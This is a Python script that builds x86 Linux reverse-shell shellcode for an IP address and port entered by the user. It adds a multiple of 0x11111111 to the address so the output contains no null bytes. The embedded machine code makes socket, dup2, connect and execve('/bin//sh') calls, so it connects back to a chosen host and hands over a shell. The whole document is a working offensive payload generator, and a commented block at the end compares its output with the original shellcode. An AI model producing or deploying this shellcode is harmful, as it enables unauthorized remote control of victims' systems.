#!/usr/bin/env python3
import os
import sys
import socket
import binascii
import struct


def validate_ip(ip_addr):
	try:
	    socket.inet_aton(ip_addr)
	except socket.error:
	    print("Invalid IP")
	    sys.exit(0)


def validate_port(port):
	try:
		port_ = int(port)
		if port_ < 0 or port_ > 65535:
			print("Invalid Port")
			sys.exit(0)		
	except: 		
		print("Invalid Port")
		sys.exit(0)		


def ip_to_hex(ip_addr, intentos):
	# IP to big number
	orig_ip_bignum = struct.unpack("!L", socket.inet_aton(ip_addr))[0]
	# 286331153 is the decimal value of 0x11111111
	sum_ip_bignum = orig_ip_bignum + 286331153 * intentos
	# Get the IP address from the sum
	new_ip_addr = socket.inet_ntoa(struct.pack('!L', sum_ip_bignum))
	# Get the hexadecimal from the IP address
	hex_ip = binascii.hexlify(socket.inet_aton(new_ip_addr)).decode("utf-8")
	return hex_ip


def num_to_hex(port):
	return hex(int(port))[2:]


def to_shellcode(line):
	n = 2
	aux = ["\\x"+line[i:i+n] for i in range(0, len(line), n)]
	shellcode = ''.join(aux)
	return shellcode


def check_nops_shellcode(shellcode):
	if not '00' in shellcode.split("\\x"):
		return True
	else:
		return False

if len(sys.argv) == 3:
	new_ip = sys.argv[1] 
	new_port = sys.argv[2] 
else:
	new_ip = input("Select IP:\t")
	new_port = input("Select port:\t")

validate_ip(new_ip)
validate_port(new_port)

### IP
intentos = 1
while 1:
	# [IP Hexadecimal value] + 0x11111111*intentos
	hex_ip = ip_to_hex(new_ip, intentos)
	# Shellcode of the [IP Hexadecimal value] + 0x11111111*intentos
	ip_shellcode = to_shellcode(hex_ip) 
	# Check if there is a NOP
	if check_nops_shellcode(ip_shellcode):
		break
	else:
		intentos += 1

### AUX value
# The aux value (0x11111111*intentos) used to add in the original IP and then substract from it
hex_aux_sub = to_shellcode(num_to_hex(286331153*intentos))

### PORT
hex_port = num_to_hex(new_port)
port_shellcode = to_shellcode(hex_port)

new_shellcode = 		"\\x31\\xc0\\x66\\xb8\\x67\\x01\\x31\\xdb\\xb3\\x02\\x31\\xc9\\xb1\\x01\\x31\\xd2\\xcd\\x80\\x89\\xc6\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x31\\xc9\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x31\\xc9\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x31\\xff\\xbf"+ip_shellcode     +"\\x81\\xef"+hex_aux_sub+     "\\x57\\x66\\x68"+port_shellcode+"\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x66\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
print(new_shellcode)

'''
print(hex_aux_sub)
print(hex_ip)
print(hex_port)
print(ip_shellcode)
print(port_shellcode) 
original_shellcode=	"\\x31\\xc0\\x66\\xb8\\x67\\x01\\x31\\xdb\\xb3\\x02\\x31\\xc9\\xb1\\x01\\x31\\xd2\\xcd\\x80\\x89\\xc6\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x31\\xc9\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x31\\xc9\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x31\\xff\\xbf\\x90\\x11\\x11\\x12\\x81\\xef\\x11\\x11\\x11\\x11\\x57\\x66\\x68\\x22\\xb8\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x66\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print(original_shellcode)
print(original_shellcode == new_shellcode)
'''